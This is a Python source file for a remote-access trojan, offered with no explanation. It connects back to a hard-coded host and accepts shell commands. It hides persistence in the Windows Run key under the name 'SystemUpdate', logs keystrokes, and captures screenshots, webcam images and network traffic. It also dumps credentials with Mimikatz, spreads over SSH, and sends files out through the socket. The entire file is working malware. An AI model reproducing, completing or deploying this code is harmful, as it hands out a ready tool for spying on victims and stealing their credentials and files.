import socket
import subprocess
import os
import time
import pyautogui
import cv2
from pynput.keyboard import Listener
from scapy.all import *
import paramiko

IP = "192.168.100.20"
PORT = 54321

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def escalate_privileges():
    subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)

def setup_persistence():
    script_path = os.path.abspath(__file__)
    
    subprocess.run([
        "powershell", "-Command",
        f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' "
        f"-Value 'python {script_path}' -PropertyType String"
    ])

def start_keylogger():
    def on_press(key):
        with open("C:\\Users\\Public\\keylogs.txt", "a") as log:
            log.write(str(key) + "\n")
    listener = Listener(on_press=on_press)
    listener.start()

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("C:\\Users\\Public\\screenshot.png")

def find_and_exfiltrate_files(extension):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    data = f.read()
                    s.send(data) 

def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("C:\\Users\\Public\\webcam.jpg", frame)
    cam.release()

def sniff_network():
    def packet_callback(packet):
        if packet.haslayer(Raw):
            with open("C:\\Users\\Public\\network_log.txt", "a") as log:
                log.write(str(packet[Raw].load) + "\n")
    sniff(prn=packet_callback, store=0)

def dump_credentials():
    subprocess.run(["powershell", "-Command", "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"], capture_output=True)

def lateral_movement(target_ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target_ip, username=username, password=password)

escalate_privileges()
setup_persistence()
start_keylogger()

# Main shell loop (this is where the fun begins)
while True:
    command = s.recv(1024).decode("utf-8")

    if command.lower() == "exit":
        break
    elif command.lower() == "screenshot":
        capture_screenshot()
    elif command.lower() == "webcam":
        capture_webcam()
    elif command.lower().startswith("exfiltrate"):
        _, extension = command.split()
        find_and_exfiltrate_files(extension)
    elif command.lower() == "sniff":
        sniff_network()
    elif command.lower() == "dumpcreds":
        dump_credentials()
    elif command.lower().startswith("move"):
        _, target_ip, username, password = command.split()
        lateral_movement(target_ip, username, password)
    else:
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        s.send(result.stdout.encode("utf-8") + result.stderr.encode("utf-8"))

s.close()
